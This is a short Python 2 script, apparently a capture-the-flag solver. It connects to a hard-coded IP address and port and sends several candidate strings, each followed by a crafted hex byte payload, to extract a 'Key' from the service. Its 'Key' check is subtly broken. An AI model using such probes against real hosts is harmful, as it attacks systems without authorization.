from socket import *
import time

ip="125.138.166.168"
port=0x5686
s=(ip,port)



a=["chickens","bannanaa","windowss","notepadd"]
b="\x23\x2f\x52\x03\x14\x16\x24\x07\xea\x71\x9e\x66\x43\x21\x49\x8a\x00\x00\x00\x00"
for i in range(len(a)):
    ss = socket(AF_INET,SOCK_STREAM)
    ss.connect(s)
    ss.send(a[i])
    ss.send(b)
    print ss.recv(1024)
    bb = ss.recv(1024)
    if bb.find("Key"):
        print bb
        break
